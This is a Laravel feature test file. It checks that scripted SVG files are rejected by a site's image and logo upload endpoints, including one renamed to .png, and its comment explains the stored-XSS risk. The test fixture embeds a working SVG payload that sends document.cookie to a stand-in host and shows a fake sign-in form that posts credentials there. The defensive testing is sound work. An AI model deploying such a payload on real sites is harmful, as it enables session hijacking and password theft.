<?php

namespace Tests\Feature;

use App\Models\PlatformUser;
use App\Models\SiteMedia;
use App\Models\SiteTheme;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * SVG UPLOADS ARE REFUSED — proved with a REAL UploadedFile, so the mime is
 * derived by finfo from the file CONTENT rather than from the filename (which
 * is all Illuminate\Http\Testing\File looks at). A rename to `.png` therefore
 * cannot smuggle one past the rule either.
 *
 * WHY IT MATTERS: `/site/media/{id}` and `/site/logo` return the stored bytes
 * under the stored mime, inline, from the app origin — and SVG is a scriptable
 * XML document, so `<svg><script>` executes with full access to staffvora.com,
 * the origin the customer app's session cookie is scoped to. That upload path
 * never passes through HtmlSanitizer, so it was a sanitiser-free stored-XSS
 * channel; `X-Content-Type-Options: nosniff` does not help, because the type is
 * not being sniffed, it is being honoured.
 *
 * This is the inverted form of the verifier's proof test: it asserted the
 * payload was accepted and served executable.
 */
class VerifySvgUploadRealMimeTest extends TestCase
{
    use RefreshDatabase;

    private const PHISH_SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="500" height="400">'
        .'<script>fetch("https://evil.test/?c="+document.cookie)</script>'
        .'<foreignObject width="500" height="400"><body xmlns="http://www.w3.org/1999/xhtml">'
        .'<h1>Sign in to Staffvora</h1><form action="https://evil.test/harvest" method="post">'
        .'<input name="email"><input name="password" type="password"><button>Sign in</button>'
        .'</form></body></foreignObject></svg>';

    private function operator(string $email): PlatformUser
    {
        return PlatformUser::create([
            'name' => 'OpVerify',
            'email' => $email,
            'password' => 'operator-secret-pw',
            'role' => 'owner',
        ]);
    }

    /** $test = true only relaxes is_uploaded_file(); getMimeType() still uses finfo on content. */
    private function realSvg(string $name): UploadedFile
    {
        $tmp = tempnam(sys_get_temp_dir(), 'poc').'.svg';
        file_put_contents($tmp, self::PHISH_SVG);

        return new UploadedFile($tmp, $name, null, null, true);
    }

    public function test_a_real_scripted_svg_is_rejected_by_the_image_upload(): void
    {
        Storage::fake('avatars');

        $file = $this->realSvg('logo.svg');
        $this->assertSame('image/svg+xml', $file->getMimeType(), 'finfo derives svg from content');

        $this->actingAs($this->operator('opverify@platform.test'), 'platform')
            ->post(route('platform.site.image'), ['image' => $file])
            ->assertSessionHasErrors('image');

        $this->assertSame(0, SiteMedia::count());
    }

    /** Renaming it does not help: the rule checks the content-derived mime. */
    public function test_a_scripted_svg_renamed_to_png_is_still_rejected(): void
    {
        Storage::fake('avatars');

        $this->actingAs($this->operator('opverify3@platform.test'), 'platform')
            ->post(route('platform.site.image'), ['image' => $this->realSvg('innocent.png')])
            ->assertSessionHasErrors('image');

        $this->assertSame(0, SiteMedia::count());
    }

    public function test_a_scripted_svg_is_rejected_by_the_logo_upload(): void
    {
        Storage::fake('avatars');

        $this->actingAs($this->operator('opverify2@platform.test'), 'platform')
            ->post(route('platform.site.logo'), ['logo' => $this->realSvg('brand.svg')])
            ->assertSessionHasErrors('logo');

        $this->assertNull(SiteTheme::current()->fresh()->logo_path);
        $this->get(route('site.media.logo'))->assertNotFound();
    }
}
